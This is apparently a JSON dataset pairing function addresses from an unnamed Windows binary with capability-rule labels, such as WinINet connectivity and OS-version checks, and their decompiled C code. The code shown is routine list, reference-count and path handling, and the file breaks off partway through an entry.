{
    "000164e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000164e0(void)\n\n{\n    if (*0x7dc98 != 0) {\n        fcn.00059140(*0x7dc88);\n        fcn.0005540c(0x7dc88);\n        fcn.00059140(*0x7dc78);\n        fcn.0005540c(0x7dc78);\n        fcn.00030d24(*0x7dc40);\n        fcn.00030d24(*0x7dc50);\n        fcn.0001ac80(*0x11600, *0x7dc48);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00016550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00016550(ulong arg1, uint64_t arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    code *pcVar8;\n    int64_t in_GS_OFFSET;\n    \n    if (((*0x7dc68 <= arg2) && (arg2 <= *0x7dc68 + 100)) && (arg1 == 0x109)) {\n        if (*0x7dc60 != NULL) {\n            uVar4 = fcn.0001aa84();\n            **0x7dc60 = *0x7dc58;\n            fcn.0001aa94(uVar4);\n        }\n        iVar5 = fcn.000666e0();\n        iVar6 = *0x7e258;\n        if (*0x7e258 == 0) {\n            iVar6 = *0x7e250;\n        }\n        uVar4 = *(iVar6 + iVar5);\n        iVar6 = (**0x11600)();\n        uVar1 = *(in_GS_OFFSET + 0x52);\n        pcVar8 = fcn.0001612c;\n        iVar5 = uVar1 * 0x40;\n        (**0x11610)(*0x7dc40 + iVar5, fcn.0001612c);\n        (**0x11620)(iVar5 + *0x7dc40, pcVar8 & 0xffffffffffffff00 | uVar1);\n        (**0x11628)(iVar5 + *0x7dc40, 0);\n        iVar3 = fcn.000307e0();\n        if (0x2e < iVar3) {\n            puVar7 = (**0x11600)();\n            *puVar7 = puVar7 + 0x200 & 0xfffffffffffff000;\n        }\n        cVar2 = (*_fcn.000115f8)();\n        if (cVar2 == '\\0') {\n            fcn.00016930(iVar6 + -8, uVar4, 0);\n        }\n        else {\n            fcn.00016c04();\n        }\n    }\n    return;\n}\n",
        "token_count": 495
    },
    "000325d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000325d8(int64_t *arg1, ulong arg2)\n\n{\n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + -1;\n        return;\n    }\n    if (arg2 == 1) {\n        LOCK();\n        arg1[1] = arg1[1] + -1;\n        return;\n    }\n    if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + -1;\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00016dac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00016dac(void)\n\n{\n    if (*0x7dcc8 != 0) {\n        fcn.000443f8();\n        fcn.0003e70c(0);\n        fcn.000571a4();\n        fcn.0004bdbc();\n        fcn.00036880();\n        fcn.0001d15c();\n        fcn.0005c2ec();\n        fcn.000230c4();\n        fcn.00066594();\n        fcn.00065dc8();\n        fcn.000662e8();\n        fcn.0002f1b0();\n        fcn.0001e20c();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0005540c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005540c(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int64_t arg1_00;\n    int64_t *noname_0;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong arg1_01;\n    int64_t *piVar6;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    arg1_00 = *arg1;\n    bVar2 = false;\n    uStackX16 = 0;\n    uStackX8 = 0;\n    iStackX32 = 0;\n    uStackX24 = 0;\n    if (*0x8d368 == 0) {\n        return 0x21590001;\n    }\n    if ((arg1_00 == 0) ||\n       ((((*(arg1_00 + 0xb0) != 0 && (*(arg1_00 + 0xb0) != 1)) || (*(arg1_00 + 0x10) == 0)) ||\n        ((*(arg1_00 + 0x28) == 0 || (*(arg1_00 + 0x20) == 0)))))) {\n        return 0x21590065;\n    }\n    if (*(arg1_00 + 0xb4) == 2) {\n        piVar6 = &iStackX32;\n        uVar5 = fcn.00054190(piVar6, &uStackX24);\n    }\n    else {\n        uVar5 = 0;\n        piVar6 = arg1;\n    }\n    if (uVar5 != 0) {\n        return uVar5;\n    }\n    if (*(arg1_00 + 0xc0) == 0) {\n        noname_0 = *(arg1_00 + 0x10);\n        *(arg1_00 + 200) = 4;\n        *(arg1_00 + 0xc0) = noname_0;\n        uVar4 = *(arg1_00 + 200);\n        piVar6 = noname_0;\n        uVar3 = fcn.0001ac10(noname_0, uVar4, 2, arg1_00 + 0xd0);\n        *(arg1_00 + 0xc0) = noname_0;\n        *(arg1_00 + 200) = uVar4;\n        uVar5 = uVar3;\n        if (uVar3 != 0) goto code_r0x000555f1;\n    }\n    uVar4 = fcn.0001aac0(CONCAT71(piVar6 >> 8, 2), &uStackX16, &uStackX8);\n    uVar5 = uVar4;\n    if (uVar4 != 0) goto code_r0x000555f1;\n    arg1_01 = fcn.0001aa84();\n    uVar4 = 0;\n    if (*0x8d360 == 0) {\ncode_r0x000555b1:\n        uVar5 = 0x21590005;\n    }\n    else {\n        piVar6 = *0x8d358 + 8;\n        do {\n            if (*piVar6 == arg1_00) {\n                uVar5 = uVar4;\n                piVar1 = *(*0x8d358 + 8 + uVar5 * 0x10) + 0xd8;\n                *piVar1 = *piVar1 + -1;\n                if (*(*(*0x8d358 + 8 + uVar5 * 0x10) + 0xd8) != 0) {\n                    uVar5 = 0;\n                    goto code_r0x000555b6;\n                }\n                *(*0x8d358 + 8 + uVar5 * 0x10) = 0;\n                *(*0x8d358 + uVar5 * 0x10) = 0;\n                uVar4 = 0xffffffff;\n                break;\n            }\n            uVar4 = uVar4 + 1;\n            piVar6 = piVar6 + 2;\n        } while (uVar4 < *0x8d360);\n        if (uVar4 != 0xffffffff) goto code_r0x000555b1;\n        fcn.00054624(arg1_00);\n        uVar5 = 0;\n        bVar2 = true;\n    }\ncode_r0x000555b6:\n    fcn.0001aa94(arg1_01);\n    fcn.0001abd4(uStackX16, uStackX8);\n    if ((uVar5 == 0) && (bVar2)) {\n        fcn.0001ac80(*(arg1_00 + 0xc0), *(arg1_00 + 0xd0));\n        fcn.000545c4(arg1);\n    }\ncode_r0x000555f1:\n    fcn.00054a78(iStackX32, uStackX24);\n    return uVar5;\n}\n",
        "token_count": 1136
    },
    "00017350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00017350(int64_t arg1)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auStackX16 [24];\n    \n    fcn.00032650(0x7dcd8, auStackX16, 1);\n    piVar2 = 0x7dcf0;\n    iVar1 = *0x7dcf0;\n    do {\n        if (iVar1 == 0) {\ncode_r0x000173a3:\n            fcn.00032684(0x7dcd8, auStackX16, 1);\n            return;\n        }\n        arg1_00 = *piVar2;\n        if (arg1_00[1] == arg1) {\n            *piVar2 = *arg1_00;\n            fcn.00030d24(arg1_00);\n            goto code_r0x000173a3;\n        }\n        iVar1 = *arg1_00;\n        piVar2 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 240
    },
    "000173c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000173c0(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    int64_t *piVar2;\n    char in_R9B;\n    char in_stack_00000028;\n    uchar auStack56 [24];\n    \n    fcn.00032650(0x7dcd8, auStack56, 1);\n    piVar2 = 0x7dcf0;\n    iVar1 = *0x7dcf0;\n    do {\n        if (iVar1 == 0) {\ncode_r0x0001743e:\n            fcn.00032684(0x7dcd8, auStack56, 1);\n            return;\n        }\n        arg1_00 = *piVar2;\n        if ((((arg1_00[1] == arg1) && (arg1_00[2] == arg2)) && (arg1_00[3] == arg3)) &&\n           ((*(arg1_00 + 4) == in_R9B && (*(arg1_00 + 0x21) == in_stack_00000028)))) {\n            *piVar2 = *arg1_00;\n            fcn.00030d24(arg1_00);\n            goto code_r0x0001743e;\n        }\n        iVar1 = *arg1_00;\n        piVar2 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 329
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "000175b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000175b4(ulong noname_0, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    \n    if (*(arg2 + 0x41) != '\\0') {\n        puVar1 = *(arg2 + 0xb8) + 3;\n        *puVar1 = *puVar1 | 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "00018424": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00018424(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    int16_t *piVar10;\n    int32_t *piVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint64_t uVar14;\n    uint32_t uStackX8;\n    int16_t aiStack624 [4];\n    int32_t *piStack616;\n    int64_t iStack608;\n    uint64_t uStack600;\n    int16_t aiStack584 [260];\n    \n    if (arg1 == 1) {\n        iStack608 = 0x40;\ncode_r0x000184ac:\n        iVar8 = 0x48;\n    }\n    else {\n        if (arg1 == 2) {\n            iStack608 = 0x44;\n            goto code_r0x000184ac;\n        }\n        if (arg1 == 3) {\n            iStack608 = 0x5e;\n            iVar8 = 0x60;\n        }\n        else {\n            if (arg1 == 0xc) {\n                uVar7 = 8;\n                iStack608 = 0xc;\n                iVar8 = 0x10;\n                goto code_r0x000184b6;\n            }\n            if (arg1 == 0x25) {\n                iStack608 = 0x68;\n                iVar8 = 0x70;\n            }\n            else {\n                if (arg1 != 0x26) {\n                    return arg3;\n                }\n                iStack608 = 0x50;\n                iVar8 = 0x58;\n            }\n        }\n    }\n    uVar7 = 0x3c;\ncode_r0x000184b6:\n    if (arg3 == 0) {\n        arg3._0_4_ = 0;\n    }\n    else {\n        uVar14 = 0;\n        uVar12 = 0;\n        uStackX8 = arg3;\n        do {\n            uVar6 = uVar12;\n            uVar5 = *(uVar6 + uVar7 + arg2);\n            if ((uVar5 & 0xfffffffe) < 0x1fe) {\n                uVar5 = uVar5 >> 1;\n            }\n            else {\n                uVar5 = 0xff;\n            }\n            fcn.0006670a(aiStack584, iStack608 + uVar6 + arg2);\n            aiStack584[uVar5] = 0;\n            piVar11 = uVar6 + arg2;\n            uVar5 = uVar12 + *piVar11;\n            piStack616 = piVar11;\n            iVar3 = fcn.00066758();\n            if (iVar3 == 0) {\ncode_r0x0001864a:\n                if (uVar5 == uVar12) {\n                    uVar13 = uVar14;\n                    if (uVar13 == uVar12) {\n                        return 0xffffffff;\n                    }\n                    *(uVar14 + arg2) = 0;\n                    break;\n                }\n                fcn.00066752(piVar11, uVar5 + arg2, arg4 - uVar5);\n                uStackX8 = uStackX8 + (uVar12 - uVar5);\n            }\n            else {\n                uVar6 = 0xffffffffffffffff;\n                bVar2 = false;\n                piVar9 = aiStack584;\n                do {\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                    iVar1 = *piVar9;\n                    piVar9 = piVar9 + 1;\n                } while (iVar1 != 0);\n                uStack600 = ~uVar6 - 1;\n                fcn.00032650(0x7df08, aiStack624, 0);\n                piVar9 = 0x7dfd0;\n                do {\n                    if (*piVar9 == 0) break;\n                    piVar4 = fcn.00066746(piVar9, 0x3a);\n                    if (piVar4 == NULL) {\n                        uVar6 = 0xffffffffffffffff;\n                        piVar10 = piVar9;\n                        do {\n                            if (uVar6 == 0) break;\n                            uVar6 = uVar6 - 1;\n                            iVar1 = *piVar10;\n                            piVar10 = piVar10 + 1;\n                        } while (iVar1 != 0);\n                        uVar6 = ~uVar6 - 1;\n                    }\n                    else {\n                        uVar6 = piVar4 - piVar9 >> 1;\n                        piVar4 = piVar4 + 1;\n                    }\n                    if ((uVar6 <= uStack600) && (iVar3 = fcn.0006674c(aiStack584, piVar9, uVar6 * 2, 2, 2),  iVar3 == 0)\n                       ) {\n                        bVar2 = true;\n                        break;\n                    }\n                    piVar9 = piVar4;\n                } while (piVar4 != NULL);\n                fcn.00032684(0x7df08, aiStack624, 0);\n                piVar11 = piStack616;\n                if (bVar2) goto code_r0x0001864a;\n                uVar13 = uVar12;\n                if (uVar5 == uVar12) break;\n                uVar14 = uVar12;\n                uVar12 = uVar5;\n            }\n            uVar13 = uVar12;\n        } while (uVar12 < uStackX8);\n        if (uStackX8 != arg3) {\n            arg3._0_4_ = *(uVar7 + uVar13 + arg2) + uVar13 + iVar8 + -2;\n        }\n    }\n    return arg3;\n}\n",
        "token_count": 1344
    },
    "00018a58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00018a58(void)\n\n{\n    if (*0x7e1d0 != 0) {\n        *0x7e1d0 = 0;\n        if (*0x7e1d8 != 0) {\n            fcn.00017350(*0x7e1d8);\n            (*_fcn.000115b8)();\n            *0x7e1d8 = 0;\n        }\n        fcn.000173c0(0, 0x18894, 0x1837c);\n        fcn.000326c0(0x7df08);\n        if (*0x7e1e0 != 0) {\n            (*_fcn.000115b8)();\n            *0x7e1e0 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "000194a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000194a0(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    \n    iVar1 = *arg1;\n    iVar5 = 0;\n    if (arg2 == NULL) {\n        iVar3 = 0;\n        while (iVar5 = arg2,  piVar2 = arg2,  iVar1 != 0) {\n            piVar2 = *(iVar1 + 0x38);\n            if (piVar2 != NULL) {\n                for (; iVar5 = arg2,  *piVar2 != 0; piVar2 = piVar2 + 1) {\n                    arg2 = iVar5 + 1;\n                }\n            }\n            arg2 = iVar5 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = arg1[iVar3];\n        }\n    }\n    else {\n        piVar2 = 0x1;\n        iVar3 = 0;\n        while (iVar1 != 0) {\n            piVar4 = *(iVar1 + 0x38);\n            if (piVar4 != NULL) {\n                for (; *piVar4 != 0; piVar4 = piVar4 + 1) {\n                    if (*(*piVar4 + 8) != *arg2 && *arg2 <= *(*piVar4 + 8)) {\n                        piVar2 = piVar2 + 1;\n                        iVar5 = iVar5 + 1;\n                    }\n                }\n            }\n            if (iVar5 != 0) {\n                piVar2 = piVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = arg1[iVar3];\n        }\n    }\n    return piVar2 & 0xffffffff;\n}\n",
        "token_count": 415
    },
    "0001980c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.0001980c(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    \n    arg1_00 = fcn.00030c98(0x40);\n    if (arg1_00 != NULL) {\n        fcn.0006677c(arg1_00, 0, 0x40);\n        if (*arg1 == 0) {\n            iVar2 = fcn.00030c98(0x208);\n            *arg1_00 = iVar2;\n            if (iVar2 != 0) {\n                fcn.00028f34(iVar2, 0x104);\n                goto code_r0x000198be;\n            }\n        }\n        else {\n            uVar3 = 0xffffffffffffffff;\n            piVar4 = arg1;\n            do {\n                if (uVar3 == 0) break;\n                uVar3 = uVar3 - 1;\n                iVar1 = *piVar4;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 != 0);\n            if (arg1[~uVar3 - 2] == 0x5c) {\n                iVar2 = fcn.00030d84(arg1);\n                *arg1_00 = iVar2;\n                if (iVar2 != 0) {\ncode_r0x000198be:\n                    *(arg1_00 + 5) = 0x10;\n                    return arg1_00;\n                }\n            }\n            else {\n                iVar2 = fcn.00030c98(~uVar3 * 2 + 2);\n                *arg1_00 = iVar2;\n                if (iVar2 != 0) {\n                    fcn.00066788(iVar2, 0x11a88, arg1);\n                    goto code_r0x000198be;\n                }\n            }\n        }\n        fcn.00030d24(arg1_00);\n    }\n    return NULL;\n}\n",
        "token_count": 461
    },
    "000198f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000198f4(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg1 != NULL) {\n        iVar1 = arg1[7];\n        if (iVar1 != 0) {\n            iVar2 = 0;\n            do {\n                if (*(iVar2 + iVar1) == 0) break;\n                fcn.000198d0(*(iVar2 + iVar1));\n                iVar1 = arg1[7];\n                iVar2 = iVar2 + 8;\n            } while (iVar1 != 0);\n        }\n        fcn.00030d24(*arg1);\n        fcn.00030d24(arg1[7]);\n        fcn.00030d24(arg1);\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00019f34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00019f34(int64_t arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t arg1_00;\n    int64_t iVar8;\n    uint32_t uVar9;\n    int64_t *arg1_01;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    int64_t **in_stack_00000028;\n    int64_t iStack632;\n    int64_t iStack616;\n    uchar auStack600 [536];\n    \n    if (arg1 == 0) {\n        iVar3 = 0x21590065;\n    }\n    else if (in_stack_00000028 == NULL) {\n        iVar3 = 0x21590069;\n    }\n    else {\n        *in_stack_00000028 = NULL;\n        piVar4 = fcn.00030c98(0x10);\n        if (piVar4 == NULL) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            piVar4[1] = 0;\n            iVar5 = fcn.0001980c(arg1);\n            *piVar4 = iVar5;\n            arg1_01 = piVar4;\n            if (iVar5 == 0) {\ncode_r0x0001a1bf:\n                iVar3 = 0x21590004;\ncode_r0x0001a1c4:\n                iVar10 = 0;\n                iVar5 = *arg1_01;\n                while (iVar5 != 0) {\n                    fcn.000198f4(iVar5);\n                    iVar10 = iVar10 + 1;\n                    iVar5 = arg1_01[iVar10];\n                }\n                fcn.00030d24(arg1_01);\n            }\n            else {\n                uVar9 = 1;\n                iStack616 = 0;\n                iStack632 = 1;\n                if (iVar5 != 0) {\n                    iVar5 = 0;\n                    do {\n                        iVar3 = fcn.0001994c(arg2, arg4, *(iVar5 + arg1_01));\n                        if (iVar3 != 0) goto code_r0x0001a1c4;\n                        piVar4 = arg1_01;\n                        if (noname_2 != '\\0') {\n                            iVar3 = 0;\n                            iVar10 = 0;\n                            piVar7 = *(*(iVar5 + arg1_01) + 0x38);\n                            if (piVar7 != NULL) {\n                                for (; *piVar7 != 0; piVar7 = piVar7 + 1) {\n                                    if ((*(*piVar7 + 0x28) & 0x10) != 0) {\n                                        iVar3 = iVar3 + 1;\n                                        iVar10 = iVar10 + 1;\n                                    }\n                                }\n                                if (0 < iVar10) {\n                                    uVar12 = iVar3 + uVar9;\n                                    uVar1 = uVar12 + 1;\n                                    uVar11 = uVar9 + 1 << 3;\n                                    arg1_00 = uVar1 << 3;\n                                    if (uVar1 == 0) {\n                                        fcn.00030d24(arg1_01);\n                                        piVar4 = NULL;\n                                    }\n                                    else {\n                                        piVar4 = fcn.00030c98(arg1_00);\n                                        if (piVar4 == NULL) goto code_r0x0001a1bf;\n                                        if (arg1_00 < uVar11) {\n                                            uVar11 = arg1_00;\n                                        }\n                                        fcn.0006670a(piVar4, arg1_01, uVar11);\n                                        fcn.00030d24(arg1_01);\n                                    }\n                                    if (uVar9 < uVar1) {\n                                        fcn.0006677c(piVar4 + iStack632, 0, uVar1 - uVar9 << 3);\n                                    }\n                                    iVar8 = 0;\n                                    if (uVar9 < uVar12) {\n                                        piVar7 = piVar4 + iStack632;\n                                        do {\n                                            puVar2 = *(iVar5 + piVar4);\n                                            iVar6 = puVar2[7];\n                                            while ((*(iVar6 + iVar8 * 8) != 0 &&\n                                                   ((*(*(iVar6 + iVar8 * 8) + 0x28) & 0x10) == 0))) {\n                                                iVar8 = iVar8 + 1;\n                                            }\n                                            if (*(iVar6 + iVar8 * 8) == 0) {\n                                                fcn.00066722(auStack600, 0x104, 0x11aa0, *puVar2);\n                                            }\n                                            else {\n                                                fcn.00066722(auStack600, 0x104, 0x11ab8, *puVar2, \n                                                             **(puVar2[7] + iVar8 * 8));\n                                            }\n                                            iVar6 = fcn.0001980c(auStack600);\n                                            *piVar7 = iVar6;\n                                            arg1_01 = piVar4;\n                                            if (iVar6 == 0) goto code_r0x0001a1bf;\n                                            uVar9 = uVar9 + 1;\n                                            piVar7 = piVar7 + 1;\n                                            iVar8 = iVar8 + 1;\n                                        } while (uVar9 < uVar12);\n                                    }\n                                    iStack632 = iStack632 + iVar10;\n                                    uVar9 = uVar12;\n                                }\n                            }\n                        }\n                        iStack616 = iStack616 + 1;\n                        iVar5 = iStack616 * 8;\n                        arg1_01 = piVar4;\n                    } while (piVar4[iStack616] != 0);\n                }\n                iVar3 = 0;\n                *in_stack_00000028 = piVar4;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1348
    },
    "0001a264": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.0001a264(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    uint32_t *puVar8;\n    char acStackX8 [8];\n    int64_t iStackX16;\n    ulong auStackX24 [2];\n    ulong uStack96;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    \n    iVar1 = fcn.0006675e();\n    if (arg1 == iVar1) {\n        uVar3 = fcn.0004cd24(0xffffffffffffffff, acStackX8);\n        if (((uVar3 == 0) && (uVar3 = fcn.0004e2d8(0xffffffffffffffff, &iStackX16),  uVar3 == 0)) &&\n           ((*0x7e248 != NULL ||\n            ((uVar3 = fcn.00030a40(0x11ae0, auStackX24),  uVar3 == 0 &&\n             (uVar3 = fcn.0004e130(auStackX24[0], 0x11ac8, 0x7e248),  uVar3 == 0)))))) {\n            if (acStackX8[0] == '\\0') {\n                piVar7 = *(iStackX16 + 0x38);\n                (**0x11330)(piVar7, 0x28, 1);\n                iVar5 = *piVar7;\n                (**0x11330)(iVar5, 0x30, 1);\n                do {\n                    if (((piVar7 != NULL) && (piVar7[2] != 0)) && (iVar4 = fcn.000667ac(),  piVar7[2] == iVar4)) {\n                        while (0 < *(piVar7 + 0xc)) {\n                            (**0x7e248)(piVar7);\n                        }\n                    }\n                    iVar4 = *(iVar5 + 0x10);\n                    iVar5 = iVar4 + -0x10;\n                    (**0x11330)(iVar5, 0x30, 1);\n                    piVar7 = *(iVar4 + -8);\n                    (**0x11330)(piVar7, 0x28);\n                } while (piVar7 != *(iStackX16 + 0x38));\n            }\n            else {\n                puVar8 = *(iStackX16 + 0x1c);\n                (**0x11330)(puVar8, 0x18, 1);\n                uVar6 = *puVar8;\n                (**0x11330)(uVar6, 0x20, 1);\n                do {\n                    if (((puVar8 != NULL) && (puVar8[3] != 0)) && (uVar2 = fcn.000667ac(),  puVar8[3] == uVar2)) {\n                        while (0 < puVar8[2]) {\n                            uStack88 = puVar8[1];\n                            uStack84 = puVar8[2];\n                            uStack80 = puVar8[3];\n                            uStack72 = puVar8[4];\n                            uStack64 = puVar8[5];\n                            uStack96 = 0;\n                            (**0x7e248)(&uStack96);\n                            puVar8[1] = uStack88;\n                            puVar8[2] = uStack84;\n                            puVar8[3] = uStack80;\n                            puVar8[4] = uStack72;\n                            puVar8[5] = uStack64;\n                        }\n                    }\n                    uVar2 = *(uVar6 + 8);\n                    uVar6 = uVar2 - 8;\n                    (**0x11330)(uVar6, 0x20, 1);\n                    puVar8 = *(uVar2 - 4);\n                    (**0x11330)(puVar8, 0x18);\n                } while (puVar8 != *(iStackX16 + 0x1c));\n            }\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 982
    },
    "0001aac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
